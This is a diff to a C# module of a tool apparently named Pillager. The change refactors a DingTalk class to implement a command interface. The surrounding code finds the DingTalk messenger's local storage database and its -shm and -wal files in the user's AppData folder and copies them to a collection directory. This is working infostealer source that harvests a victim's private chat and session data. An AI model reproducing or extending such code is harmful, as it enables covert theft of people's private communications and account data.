@@ -1,13 +1,12 @@
-﻿using System;
+﻿using Pillager.Helper;
+using System;
 using System.IO;
 
 namespace Pillager.Messengers
 {
-    internal class DingTalk
+    internal class DingTalk : ICommand
     {
-        public static string MessengerName = "DingTalk";
-
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
@@ -15,7 +14,7 @@ namespace Pillager.Messengers
                 if (!File.Exists(storagepath)) return;
                 string storageshmpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db-shm");
                 string storagewalpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db-wal");
-                string savepath = Path.Combine(path, MessengerName);
+                string savepath = Path.Combine(path, "DingTalk");
                 Directory.CreateDirectory(savepath);
                 File.Copy(storagepath, Path.Combine(savepath, "storage.db"));
                 if (File.Exists(storageshmpath))
